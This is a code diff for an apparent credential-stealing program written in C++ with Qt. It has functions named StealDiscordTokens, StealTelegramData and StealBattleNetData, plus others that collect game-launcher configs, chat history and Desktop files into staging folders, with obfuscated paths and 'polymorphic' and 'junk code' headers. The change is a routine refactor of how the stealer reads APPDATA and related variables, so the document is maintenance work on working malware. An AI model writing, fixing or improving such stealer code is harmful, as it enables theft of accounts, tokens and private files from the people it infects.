@@ -4,6 +4,7 @@
 #include "polymorphic_code.h"
 #include "junk_code.h"
 
+#include <cstdlib>
 #include <QMessageBox>
 #include <QProcess>
 #include <QFileDialog>
@@ -589,15 +590,12 @@ std::string MainWindow::StealArizonaRPData(const std::string& dir) {
     std::string result;
 
     // Получаем путь к APPDATA
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+    const char* appDataPath = std::getenv("APPDATA");
+    if (!appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA для Arizona RP");
-        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
-    free(appDataPath);
 
     // Путь к samp.ini (конфигурация SAMP)
     std::string sampConfigPath = appData + "\\SA-MP\\samp.ini";
@@ -670,15 +668,12 @@ std::string MainWindow::StealRadmirRPData(const std::string& dir) {
     std::string result;
 
     // Получаем путь к APPDATA
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+    const char* appDataPath = std::getenv("APPDATA");
+    if (!appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA для Radmir RP");
-        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
-    free(appDataPath);
 
     // Путь к settings.ini (конфигурация Radmir CRMP)
     std::string radmirConfigPath = appData + "\\RadmirCRMP\\settings.ini";
@@ -2085,15 +2080,12 @@ std::string MainWindow::StealDiscordTokens(const std::string& dir) {
     std::string discordDir = dir + "\\DiscordData";
     std::filesystem::create_directories(discordDir);
 
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+    const char* appDataPath = std::getenv("APPDATA");
+    if (!appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA");
-        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
-    free(appDataPath);
 
     std::vector<std::string> discordPaths = {
         appData + decryptString(encryptedDiscordPath, 0),
@@ -2131,15 +2123,12 @@ std::string MainWindow::StealTelegramData(const std::string& dir) {
     std::string telegramDir = dir + "\\TelegramData";
     std::filesystem::create_directories(telegramDir);
 
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+    const char* appDataPath = std::getenv("APPDATA");
+    if (!appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA");
-        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
-    free(appDataPath);
 
     std::string telegramPath = appData + decryptString(encryptedTelegramPath, 0);
     if (!std::filesystem::exists(telegramPath)) {
@@ -2238,15 +2227,12 @@ std::string MainWindow::StealEpicGamesData(const std::string& dir) {
     std::string epicDir = dir + "\\EpicGamesData";
     std::filesystem::create_directories(epicDir);
 
-    char* localAppDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
+    const char* localAppDataPath = std::getenv("LOCALAPPDATA");
+    if (!localAppDataPath) {
         emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA");
-        free(localAppDataPath);
         return "";
     }
     std::string localAppData(localAppDataPath);
-    free(localAppDataPath);
 
     std::string epicPath = localAppData + "\\EpicGamesLauncher\\Saved\\Config";
     if (!std::filesystem::exists(epicPath)) {
@@ -2316,15 +2302,12 @@ std::string MainWindow::StealBattleNetData(const std::string& dir) {
     std::string battleNetDir = dir + "\\BattleNetData";
     std::filesystem::create_directories(battleNetDir);
 
-    char* localAppDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA") != 0 || !localAppDataPath) {
+    const char* localAppDataPath = std::getenv("LOCALAPPDATA");
+    if (!localAppDataPath) {
         emitLog("Ошибка: Не удалось получить путь к LOCALAPPDATA");
-        free(localAppDataPath);
         return "";
     }
     std::string localAppData(localAppDataPath);
-    free(localAppDataPath);
 
     std::string battleNetPath = localAppData + "\\Battle.net";
     if (!std::filesystem::exists(battleNetPath)) {
@@ -2356,15 +2339,12 @@ std::string MainWindow::StealMinecraftData(const std::string& dir) {
     std::string minecraftDir = dir + "\\MinecraftData";
     std::filesystem::create_directories(minecraftDir);
 
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+    const char* appDataPath = std::getenv("APPDATA");
+    if (!appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA");
-        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
-    free(appDataPath);
 
     std::string minecraftPath = appData + "\\.minecraft";
     if (!std::filesystem::exists(minecraftPath)) {
@@ -2409,15 +2389,12 @@ std::vector<std::string> MainWindow::GrabFiles(const std::string& dir) {
     std::filesystem::create_directories(grabDir);
 
     std::vector<std::string> grabbedFiles;
-    char* userProfilePath = nullptr;
-    size_t len;
-    if (_dupenv_s(&userProfilePath, &len, "USERPROFILE") != 0 || !userProfilePath) {
+    const char* userProfilePath = std::getenv("USERPROFILE");
+    if (!userProfilePath) {
         emitLog("Ошибка: Не удалось получить путь к USERPROFILE");
-        free(userProfilePath);
         return {};
     }
     std::string userProfile(userProfilePath);
-    free(userProfilePath);
 
     std::vector<std::string> targetDirs = {
         userProfile + "\\Desktop",
@@ -2454,15 +2431,12 @@ std::string MainWindow::stealChatHistory(const std::string& dir) {
     std::filesystem::create_directories(chatDir);
 
     std::string result;
-    char* appDataPath = nullptr;
-    size_t len;
-    if (_dupenv_s(&appDataPath, &len, "APPDATA") != 0 || !appDataPath) {
+    const char* appDataPath = std::getenv("APPDATA");
+    if (!appDataPath) {
         emitLog("Ошибка: Не удалось получить путь к APPDATA");
-        free(appDataPath);
         return "";
     }
     std::string appData(appDataPath);
-    free(appDataPath);
 
     // Discord chat history (leveldb logs)
     std::string discordPath = appData + decryptString(encryptedDiscordPath, 0);
